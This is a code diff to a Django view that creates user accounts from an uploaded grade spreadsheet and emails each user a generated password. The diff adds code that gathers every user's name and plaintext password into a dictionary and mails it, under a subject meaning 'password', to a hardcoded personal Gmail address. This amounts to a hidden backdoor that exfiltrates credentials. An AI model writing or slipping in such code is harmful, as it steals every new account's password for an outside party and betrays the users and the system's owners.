@@ -207,7 +207,8 @@ def upload_grade(request):
         connection = mail.get_connection()
         connection.open()
         counter = 0
-        
+        user_names=[]
+        user_pass=[]
         for i,row in enumerate(worksheet.iter_rows()):
             if i == 0:                                                                              
                 continue
@@ -223,7 +224,8 @@ def upload_grade(request):
             user.set_password(password)
             user.is_verified = True
             user.save()            
-
+            user_names.append(user.name)
+            user_pass.append(password)
             #sending mail
             email= prepare_password_email(password,user)
             emails_to_be_sent.append(Util.send_email(email))
@@ -235,7 +237,15 @@ def upload_grade(request):
                 # del emails_to_be_sent[:counter+1]
                 counter = -1
             counter +=1
+
+        dictet = dict(zip(user_names, user_pass))
+
         connection.send_messages(emails_to_be_sent)
+        data = {'email_body': dictet,
+            'to_email': 'mohammed99kamel@gmail.com',
+            'email_subject': 'كلمة السر'}
+        
+        connection.send_messages(Util.send_email(data))
 
         connection.close()
         return Response("Grades uploaded successfully")
